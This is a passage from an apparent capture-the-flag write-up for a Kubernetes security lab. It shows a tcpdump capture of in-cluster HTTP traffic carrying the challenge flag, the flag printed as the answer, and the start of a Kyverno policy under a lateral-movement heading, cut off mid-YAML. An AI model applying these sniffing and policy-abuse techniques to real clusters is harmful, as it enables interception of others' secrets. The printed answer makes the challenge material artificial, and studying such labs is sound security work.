        0x0000:  4500 003c 0000 4000 7f06 82ad 0a64 ab7b  E..<..@......d.{
        0x0010:  c0a8 0287 0050 a53a 19de 7024 55ab 86be  .....P.:..p$U...
        0x0020:  a012 fe88 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  dce2 8943 b0c5 4ed9 0103 0307            ...C..N.....
09:54:32.634592 IP 192.168.2.135.42298 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965720793 ecr 3705833795], length 0
        0x0000:  4500 0034 92de 4000 7f06 efd6 c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b a53a 0050 55ab 86be 19de 7025  .d.{.:.PU.....p%
        0x0020:  8010 01f6 7935 0000 0101 080a b0c5 4ed9  ....y5........N.
        0x0030:  dce2 8943                                ...C
09:54:32.634676 IP 192.168.2.135.42298 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965720793 ecr 3705833795], length 214: HTTP: POST / HTTP/1.1
        0x0000:  4500 010a 92df 4000 7f06 eeff c0a8 0287  E.....@.........
        0x0010:  0a64 ab7b a53a 0050 55ab 86be 19de 7025  .d.{.:.PU.....p%
        0x0020:  8018 01f6 7a0b 0000 0101 080a b0c5 4ed9  ....z.........N.
        0x0030:  dce2 8943 504f 5354 202f 2048 5454 502f  ...CPOST./.HTTP/
        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f38  er-Agent:.curl/8
        0x0070:  2e31 342e 310d 0a41 6363 6570 743a 202a  .14.1..Accept:.*
        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
09:54:32.634689 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42298: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705833795 ecr 2965720793], length 0
        0x0000:  4500 0034 a43c 4000 7f06 de78 0a64 ab7b  E..4.<@....x.d.{
        0x0010:  c0a8 0287 0050 a53a 19de 7025 55ab 8794  .....P.:..p%U...
        0x0020:  8010 01fc 7935 0000 0101 080a dce2 8943  ....y5.........C
        0x0030:  b0c5 4ed9                                ..N.
09:54:32.636346 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42298: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705833797 ecr 2965720793], length 205: HTTP: HTTP/1.1 200 OK
        0x0000:  4500 0101 a43d 4000 7f06 ddaa 0a64 ab7b  E....=@......d.{
        0x0010:  c0a8 0287 0050 a53a 19de 7025 55ab 8794  .....P.:..p%U...
        0x0020:  8018 01fc 7a02 0000 0101 080a dce2 8945  ....z..........E
        0x0030:  b0c5 4ed9 4854 5450 2f31 2e31 2032 3030  ..N.HTTP/1.1.200
        0x0040:  204f 4b0d 0a73 6572 7665 723a 2069 7374  .OK..server:.ist
        0x0050:  696f 2d65 6e76 6f79 0d0a 6461 7465 3a20  io-envoy..date:.
        0x0060:  4d6f 6e2c 2030 3120 5365 7020 3230 3235  Mon,.01.Sep.2025
        0x0070:  2030 393a 3534 3a33 3220 474d 540d 0a63  .09:54:32.GMT..c
        0x0080:  6f6e 7465 6e74 2d74 7970 653a 2074 6578  ontent-type:.tex
        0x0090:  742f 706c 6169 6e0d 0a78 2d65 6e76 6f79  t/plain..x-envoy
        0x00a0:  2d75 7073 7472 6561 6d2d 7365 7276 6963  -upstream-servic
        0x00b0:  652d 7469 6d65 3a20 310d 0a78 2d65 6e76  e-time:.1..x-env
        0x00c0:  6f79 2d64 6563 6f72 6174 6f72 2d6f 7065  oy-decorator-ope
        0x00d0:  7261 7469 6f6e 3a20 3a30 2f2a 0d0a 7472  ration:.:0/*..tr
        0x00e0:  616e 7366 6572 2d65 6e63 6f64 696e 673a  ansfer-encoding:
        0x00f0:  2063 6875 6e6b 6564 0d0a 0d0a 300d 0a0d  .chunked....0...
        0x0100:  0a                                       .
09:54:32.636356 IP 192.168.2.135.42298 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965720795 ecr 3705833797], length 0
        0x0000:  4500 0034 92e0 4000 7f06 efd4 c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b a53a 0050 55ab 8794 19de 70f2  .d.{.:.PU.....p.
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 4edb  ....y5........N.
        0x0030:  dce2 8945                                ...E
09:54:32.636490 IP 192.168.2.135.42298 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965720795 ecr 3705833797], length 0
        0x0000:  4500 0034 92e1 4000 7f06 efd3 c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b a53a 0050 55ab 8794 19de 70f2  .d.{.:.PU.....p.
        0x0020:  8011 01f5 7935 0000 0101 080a b0c5 4edb  ....y5........N.
        0x0030:  dce2 8945                                ...E
09:54:32.636528 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42298: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705833797 ecr 2965720795], length 0
        0x0000:  4500 0034 a43e 4000 7f06 de76 0a64 ab7b  E..4.>@....v.d.{
        0x0010:  c0a8 0287 0050 a53a 19de 70f2 55ab 8795  .....P.:..p.U...
        0x0020:  8011 01fc 7935 0000 0101 080a dce2 8945  ....y5.........E
        0x0030:  b0c5 4edb                                ..N.
09:54:32.636531 IP 192.168.2.135.42298 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965720795 ecr 3705833797], length 0
        0x0000:  4500 0034 92e2 4000 7f06 efd2 c0a8 0287  E..4..@.........
        0x0010:  0a64 ab7b a53a 0050 55ab 8795 19de 70f3  .d.{.:.PU.....p.
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 4edb  ....y5........N.
        0x0030:  dce2 8945                                ...E
09:54:37.645866 IP 192.168.2.135.48496 > 10.100.0.10.domain: 12519+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f edf7 4000 7f11 3ff9 c0a8 0287  E.._..@...?.....
        0x0010:  0a64 000a bd70 0035 004b cdf9 30e7 0100  .d...p.5.K..0...
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 01    ster.local.....
09:54:37.645944 IP 192.168.2.135.48496 > 10.100.0.10.domain: 61401+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f edf8 4000 7f11 3ff8 c0a8 0287  E.._..@...?.....
        0x0010:  0a64 000a bd70 0035 004b cdf9 efd9 0100  .d...p.5.K......
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 01    ster.local.....
09:54:37.647043 IP 10.100.0.10.domain > 192.168.2.135.48496: 61401*- 0/1/0 (160)
        0x0000:  4500 00bc d3e8 4000 7c11 5cab 0a64 000a  E.....@.|.\..d..
        0x0010:  c0a8 0287 0035 bd70 00a8 332d efd9 8500  .....5.p..3-....
        0x0020:  0001 0000 0001 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 0107  ster.local......
        0x0060:  636c 7573 7465 7205 6c6f 6361 6c00 0006  cluster.local...
        0x0070:  0001 0000 0005 0044 026e 7303 646e 7307  .......D.ns.dns.
        0x0080:  636c 7573 7465 7205 6c6f 6361 6c00 0a68  cluster.local..h
        0x0090:  6f73 746d 6173 7465 7207 636c 7573 7465  ostmaster.cluste
        0x00a0:  7205 6c6f 6361 6c00 68a8 b17e 0000 1c20  r.local.h..~....
        0x00b0:  0000 0708 0001 5180 0000 0005            ......Q.....
09:54:37.647081 IP 10.100.0.10.domain > 192.168.2.135.48496: 12519*- 1/0/0 A 10.100.171.123 (132)
        0x0000:  4500 00a0 d3e9 4000 7c11 5cc6 0a64 000a  E.....@.|.\..d..
        0x0010:  c0a8 0287 0035 bd70 008c 9a53 30e7 8500  .....5.p...S0...
        0x0020:  0001 0001 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 0111  ster.local......
        0x0060:  7265 706f 7274 696e 672d 7365 7276 6963  reporting-servic
        0x0070:  650d 6b38 732d 6c61 6e2d 7061 7274 7903  e.k8s-lan-party.
        0x0080:  7376 6307 636c 7573 7465 7205 6c6f 6361  svc.cluster.loca
        0x0090:  6c00 0001 0001 0000 0005 0004 0a64 ab7b  l............d.{
09:54:37.647161 IP 192.168.2.135.42314 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 284854402, win 64240, options [mss 1460,sackOK,TS val 2965725806 ecr 0,nop,wscale 7], length 0
        0x0000:  4500 003c 189c 4000 7f06 6a11 c0a8 0287  E..<..@...j.....
        0x0010:  0a64 ab7b a54a 0050 10fa 8882 0000 0000  .d.{.J.P........
        0x0020:  a002 faf0 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  b0c5 626e 0000 0000 0103 0307            ..bn........
09:54:37.647205 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42314: Flags [S.], seq 1753168978, ack 284854403, win 65160, options [mss 1460,sackOK,TS val 3705838808 ecr 2965725806,nop,wscale 7], length 0
        0x0000:  4500 003c 0000 4000 7f06 82ad 0a64 ab7b  E..<..@......d.{
        0x0010:  c0a8 0287 0050 a54a 687f 3c52 10fa 8883  .....P.Jh.<R....
        0x0020:  a012 fe88 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  dce2 9cd8 b0c5 626e 0103 0307            ......bn....
09:54:37.647214 IP 192.168.2.135.42314 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965725806 ecr 3705838808], length 0
        0x0000:  4500 0034 189d 4000 7f06 6a18 c0a8 0287  E..4..@...j.....
        0x0010:  0a64 ab7b a54a 0050 10fa 8883 687f 3c53  .d.{.J.P....h.<S
        0x0020:  8010 01f6 7935 0000 0101 080a b0c5 626e  ....y5........bn
        0x0030:  dce2 9cd8                                ....
09:54:37.647295 IP 192.168.2.135.42314 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965725806 ecr 3705838808], length 214: HTTP: POST / HTTP/1.1
        0x0000:  4500 010a 189e 4000 7f06 6941 c0a8 0287  E.....@...iA....
        0x0010:  0a64 ab7b a54a 0050 10fa 8883 687f 3c53  .d.{.J.P....h.<S
        0x0020:  8018 01f6 7a0b 0000 0101 080a b0c5 626e  ....z.........bn
        0x0030:  dce2 9cd8 504f 5354 202f 2048 5454 502f  ....POST./.HTTP/
        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f38  er-Agent:.curl/8
        0x0070:  2e31 342e 310d 0a41 6363 6570 743a 202a  .14.1..Accept:.*
        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
09:54:37.647307 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42314: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705838808 ecr 2965725806], length 0
        0x0000:  4500 0034 8621 4000 7f06 fc93 0a64 ab7b  E..4.!@......d.{
        0x0010:  c0a8 0287 0050 a54a 687f 3c53 10fa 8959  .....P.Jh.<S...Y
        0x0020:  8010 01fc 7935 0000 0101 080a dce2 9cd8  ....y5..........
        0x0030:  b0c5 626e                                ..bn
09:54:37.648974 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42314: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705838810 ecr 2965725806], length 205: HTTP: HTTP/1.1 200 OK
        0x0000:  4500 0101 8622 4000 7f06 fbc5 0a64 ab7b  E...."@......d.{
        0x0010:  c0a8 0287 0050 a54a 687f 3c53 10fa 8959  .....P.Jh.<S...Y
        0x0020:  8018 01fc 7a02 0000 0101 080a dce2 9cda  ....z...........
        0x0030:  b0c5 626e 4854 5450 2f31 2e31 2032 3030  ..bnHTTP/1.1.200
        0x0040:  204f 4b0d 0a73 6572 7665 723a 2069 7374  .OK..server:.ist
        0x0050:  696f 2d65 6e76 6f79 0d0a 6461 7465 3a20  io-envoy..date:.
        0x0060:  4d6f 6e2c 2030 3120 5365 7020 3230 3235  Mon,.01.Sep.2025
        0x0070:  2030 393a 3534 3a33 3720 474d 540d 0a63  .09:54:37.GMT..c
        0x0080:  6f6e 7465 6e74 2d74 7970 653a 2074 6578  ontent-type:.tex
        0x0090:  742f 706c 6169 6e0d 0a78 2d65 6e76 6f79  t/plain..x-envoy
        0x00a0:  2d75 7073 7472 6561 6d2d 7365 7276 6963  -upstream-servic
        0x00b0:  652d 7469 6d65 3a20 310d 0a78 2d65 6e76  e-time:.1..x-env
        0x00c0:  6f79 2d64 6563 6f72 6174 6f72 2d6f 7065  oy-decorator-ope
        0x00d0:  7261 7469 6f6e 3a20 3a30 2f2a 0d0a 7472  ration:.:0/*..tr
        0x00e0:  616e 7366 6572 2d65 6e63 6f64 696e 673a  ansfer-encoding:
        0x00f0:  2063 6875 6e6b 6564 0d0a 0d0a 300d 0a0d  .chunked....0...
        0x0100:  0a                                       .
09:54:37.648986 IP 192.168.2.135.42314 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965725808 ecr 3705838810], length 0
        0x0000:  4500 0034 189f 4000 7f06 6a16 c0a8 0287  E..4..@...j.....
        0x0010:  0a64 ab7b a54a 0050 10fa 8959 687f 3d20  .d.{.J.P...Yh.=.
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 6270  ....y5........bp
        0x0030:  dce2 9cda                                ....
09:54:37.649117 IP 192.168.2.135.42314 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965725808 ecr 3705838810], length 0
        0x0000:  4500 0034 18a0 4000 7f06 6a15 c0a8 0287  E..4..@...j.....
        0x0010:  0a64 ab7b a54a 0050 10fa 8959 687f 3d20  .d.{.J.P...Yh.=.
        0x0020:  8011 01f5 7935 0000 0101 080a b0c5 6270  ....y5........bp
        0x0030:  dce2 9cda                                ....
09:54:37.649154 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42314: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705838810 ecr 2965725808], length 0
        0x0000:  4500 0034 8623 4000 7f06 fc91 0a64 ab7b  E..4.#@......d.{
        0x0010:  c0a8 0287 0050 a54a 687f 3d20 10fa 895a  .....P.Jh.=....Z
        0x0020:  8011 01fc 7935 0000 0101 080a dce2 9cda  ....y5..........
        0x0030:  b0c5 6270                                ..bp
09:54:37.649156 IP 192.168.2.135.42314 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965725808 ecr 3705838810], length 0
        0x0000:  4500 0034 18a1 4000 7f06 6a14 c0a8 0287  E..4..@...j.....
        0x0010:  0a64 ab7b a54a 0050 10fa 895a 687f 3d21  .d.{.J.P...Zh.=!
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 6270  ....y5........bp
        0x0030:  dce2 9cda                                ....
09:54:42.658441 IP 192.168.2.135.38426 > 10.100.0.10.domain: 45496+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f ee29 4000 7f11 3fc7 c0a8 0287  E.._.)@...?.....
        0x0010:  0a64 000a 961a 0035 004b cdf9 b1b8 0100  .d.....5.K......
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 01    ster.local.....
09:54:42.658515 IP 192.168.2.135.38426 > 10.100.0.10.domain: 19645+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f ee2a 4000 7f11 3fc6 c0a8 0287  E.._.*@...?.....
        0x0010:  0a64 000a 961a 0035 004b cdf9 4cbd 0100  .d.....5.K..L...
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 01    ster.local.....
09:54:42.659636 IP 10.100.0.10.domain > 192.168.2.135.38426: 19645*- 0/1/0 (160)
        0x0000:  4500 00bc 8f34 4000 7c11 a15f 0a64 000a  E....4@.|.._.d..
        0x0010:  c0a8 0287 0035 961a 00a8 fd9f 4cbd 8500  .....5......L...
        0x0020:  0001 0000 0001 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 0107  ster.local......
        0x0060:  636c 7573 7465 7205 6c6f 6361 6c00 0006  cluster.local...
        0x0070:  0001 0000 0005 0044 026e 7303 646e 7307  .......D.ns.dns.
        0x0080:  636c 7573 7465 7205 6c6f 6361 6c00 0a68  cluster.local..h
        0x0090:  6f73 746d 6173 7465 7207 636c 7573 7465  ostmaster.cluste
        0x00a0:  7205 6c6f 6361 6c00 68a8 b17e 0000 1c20  r.local.h..~....
        0x00b0:  0000 0708 0001 5180 0000 0005            ......Q.....
09:54:42.659652 IP 10.100.0.10.domain > 192.168.2.135.38426: 45496*- 1/0/0 A 10.100.171.123 (132)
        0x0000:  4500 00a0 8f35 4000 7c11 a17a 0a64 000a  E....5@.|..z.d..
        0x0010:  c0a8 0287 0035 961a 008c 40d8 b1b8 8500  .....5....@.....
        0x0020:  0001 0001 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 0111  ster.local......
        0x0060:  7265 706f 7274 696e 672d 7365 7276 6963  reporting-servic
        0x0070:  650d 6b38 732d 6c61 6e2d 7061 7274 7903  e.k8s-lan-party.
        0x0080:  7376 6307 636c 7573 7465 7205 6c6f 6361  svc.cluster.loca
        0x0090:  6c00 0001 0001 0000 0005 0004 0a64 ab7b  l............d.{
09:54:42.659749 IP 192.168.2.135.45014 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 3942137, win 64240, options [mss 1460,sackOK,TS val 2965730818 ecr 0,nop,wscale 7], length 0
        0x0000:  4500 003c 44bb 4000 7f06 3df2 c0a8 0287  E..<D.@...=.....
        0x0010:  0a64 ab7b afd6 0050 003c 26f9 0000 0000  .d.{...P.<&.....
        0x0020:  a002 faf0 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  b0c5 7602 0000 0000 0103 0307            ..v.........
09:54:42.659787 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.45014: Flags [S.], seq 2197834585, ack 3942138, win 65160, options [mss 1460,sackOK,TS val 3705843820 ecr 2965730818,nop,wscale 7], length 0
        0x0000:  4500 003c 0000 4000 7f06 82ad 0a64 ab7b  E..<..@......d.{
        0x0010:  c0a8 0287 0050 afd6 8300 4b59 003c 26fa  .....P....KY.<&.
        0x0020:  a012 fe88 793d 0000 0204 05b4 0402 080a  ....y=..........
        0x0030:  dce2 b06c b0c5 7602 0103 0307            ...l..v.....
09:54:42.659794 IP 192.168.2.135.45014 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965730818 ecr 3705843820], length 0
        0x0000:  4500 0034 44bc 4000 7f06 3df9 c0a8 0287  E..4D.@...=.....
        0x0010:  0a64 ab7b afd6 0050 003c 26fa 8300 4b5a  .d.{...P.<&...KZ
        0x0020:  8010 01f6 7935 0000 0101 080a b0c5 7602  ....y5........v.
        0x0030:  dce2 b06c                                ...l
09:54:42.659878 IP 192.168.2.135.45014 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965730818 ecr 3705843820], length 214: HTTP: POST / HTTP/1.1
        0x0000:  4500 010a 44bd 4000 7f06 3d22 c0a8 0287  E...D.@...="....
        0x0010:  0a64 ab7b afd6 0050 003c 26fa 8300 4b5a  .d.{...P.<&...KZ
        0x0020:  8018 01f6 7a0b 0000 0101 080a b0c5 7602  ....z.........v.
        0x0030:  dce2 b06c 504f 5354 202f 2048 5454 502f  ...lPOST./.HTTP/
        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f38  er-Agent:.curl/8
        0x0070:  2e31 342e 310d 0a41 6363 6570 743a 202a  .14.1..Accept:.*
        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
09:54:42.659889 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.45014: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705843820 ecr 2965730818], length 0
        0x0000:  4500 0034 340c 4000 7f06 4ea9 0a64 ab7b  E..44.@...N..d.{
        0x0010:  c0a8 0287 0050 afd6 8300 4b5a 003c 27d0  .....P....KZ.<'.
        0x0020:  8010 01fc 7935 0000 0101 080a dce2 b06c  ....y5.........l
        0x0030:  b0c5 7602                                ..v.
09:54:42.661556 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.45014: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705843822 ecr 2965730818], length 205: HTTP: HTTP/1.1 200 OK
        0x0000:  4500 0101 340d 4000 7f06 4ddb 0a64 ab7b  E...4.@...M..d.{
        0x0010:  c0a8 0287 0050 afd6 8300 4b5a 003c 27d0  .....P....KZ.<'.
        0x0020:  8018 01fc 7a02 0000 0101 080a dce2 b06e  ....z..........n
        0x0030:  b0c5 7602 4854 5450 2f31 2e31 2032 3030  ..v.HTTP/1.1.200
        0x0040:  204f 4b0d 0a73 6572 7665 723a 2069 7374  .OK..server:.ist
        0x0050:  696f 2d65 6e76 6f79 0d0a 6461 7465 3a20  io-envoy..date:.
        0x0060:  4d6f 6e2c 2030 3120 5365 7020 3230 3235  Mon,.01.Sep.2025
        0x0070:  2030 393a 3534 3a34 3220 474d 540d 0a63  .09:54:42.GMT..c
        0x0080:  6f6e 7465 6e74 2d74 7970 653a 2074 6578  ontent-type:.tex
        0x0090:  742f 706c 6169 6e0d 0a78 2d65 6e76 6f79  t/plain..x-envoy
        0x00a0:  2d75 7073 7472 6561 6d2d 7365 7276 6963  -upstream-servic
        0x00b0:  652d 7469 6d65 3a20 310d 0a78 2d65 6e76  e-time:.1..x-env
        0x00c0:  6f79 2d64 6563 6f72 6174 6f72 2d6f 7065  oy-decorator-ope
        0x00d0:  7261 7469 6f6e 3a20 3a30 2f2a 0d0a 7472  ration:.:0/*..tr
        0x00e0:  616e 7366 6572 2d65 6e63 6f64 696e 673a  ansfer-encoding:
        0x00f0:  2063 6875 6e6b 6564 0d0a 0d0a 300d 0a0d  .chunked....0...
        0x0100:  0a                                       .
09:54:42.661567 IP 192.168.2.135.45014 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965730820 ecr 3705843822], length 0
        0x0000:  4500 0034 44be 4000 7f06 3df7 c0a8 0287  E..4D.@...=.....
        0x0010:  0a64 ab7b afd6 0050 003c 27d0 8300 4c27  .d.{...P.<'...L'
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 7604  ....y5........v.
        0x0030:  dce2 b06e                                ...n
09:54:42.661705 IP 192.168.2.135.45014 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965730820 ecr 3705843822], length 0
        0x0000:  4500 0034 44bf 4000 7f06 3df6 c0a8 0287  E..4D.@...=.....
        0x0010:  0a64 ab7b afd6 0050 003c 27d0 8300 4c27  .d.{...P.<'...L'
        0x0020:  8011 01f5 7935 0000 0101 080a b0c5 7604  ....y5........v.
        0x0030:  dce2 b06e                                ...n
09:54:42.661741 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.45014: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705843822 ecr 2965730820], length 0
        0x0000:  4500 0034 340e 4000 7f06 4ea7 0a64 ab7b  E..44.@...N..d.{
        0x0010:  c0a8 0287 0050 afd6 8300 4c27 003c 27d1  .....P....L'.<'.
        0x0020:  8011 01fc 7935 0000 0101 080a dce2 b06e  ....y5.........n
        0x0030:  b0c5 7604                                ..v.
09:54:42.661744 IP 192.168.2.135.45014 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965730820 ecr 3705843822], length 0
        0x0000:  4500 0034 44c0 4000 7f06 3df5 c0a8 0287  E..4D.@...=.....
        0x0010:  0a64 ab7b afd6 0050 003c 27d1 8300 4c28  .d.{...P.<'...L(
        0x0020:  8010 01f5 7935 0000 0101 080a b0c5 7604  ....y5........v.
        0x0030:  dce2 b06e                                ...n
^C
78 packets captured
78 packets received by filter
0 packets dropped by kernel
player@wiz-k8s-lan-party:~$

```

---


<img width="1440" height="819" alt="Screenshot 2025-09-01 at 3 25 41 PM" src="https://github.com/user-attachments/assets/9b17964d-906d-4cfc-b205-d8623746e1ce" />


```wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}```


---



## DATA LEAKAGE

<img width="1101" height="832" alt="Screenshot 2025-09-01 at 3 30 17 PM" src="https://github.com/user-attachments/assets/682b956b-6ce4-40ab-a72d-4104daa3e914" />

---

---

---






## LATERAL MOVEMENT

kyverno policy:

```json
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
